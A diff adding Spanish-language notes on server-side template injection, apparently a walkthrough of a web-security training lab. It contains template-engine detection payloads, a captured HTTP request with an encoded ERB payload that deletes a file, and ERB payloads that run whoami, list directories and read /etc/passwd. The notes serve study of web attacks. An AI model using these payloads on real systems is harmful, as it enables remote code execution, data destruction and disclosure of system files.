@@ -58,6 +58,71 @@ Sintaxis example
 2. enumera de que template engine se trata haciendo que el payload sea evaluado
 3. explitalo rce o solo sacar informacion.
 
+> https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+### Detect - Plaintext context( dentro de hacktricks) 
+
+```
+
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+
+```
+
+# Basic server-side template injection
+
+Para este laboratorio primero nos damos cuenta que al probar un producto nos manda en una peticion GET que no hay stock
+despues si en esa misma peticion ponemos algo cualquier cosa lo renderiza!
+
+
+```
+GET /?message=<%25%3d+system("rm+morale.txt")+%25> HTTP/1.1
+Host: 0a9a000604434cc5c04469150063005a.web-security-academy.net
+Cookie: session=9w4H3Kb9L9iMwIiijw2slP6Pt6LKHJQ0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://0a9a000604434cc5c04469150063005a.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+
+
+```
+
+Se manda la peticion al intruder y se selecciona donde estara el payload despues no dirijomos a la pestaña
+Payloads -> Payloads Options y ahi pegamos las " Plaintext context" para probar a que tipo de template engine
+nos enfrentamos. Tambien nos dirigimos a Options-> Reg Extract -> add y seleccionamos el div donde se refleja 
+nuestro output en nuesta respuesta de la pericion GET. Inciamos el ataque y vemos que la sintaxis de ERB de ruby es
+la que renderiza el 49 (7*7).
+
+Finalmente podemos ejecutar comandos con:
+
+```
+<%= system("whoami") %> #Execute code
+<%= Dir.entries('/') %> #List folder
+<%= File.open('/etc/passwd').read %> #Read file
+
+```
+
+Borrando el archivo ( recuerda usar URL encode)
+
+
+
+
+
+
 
 
 
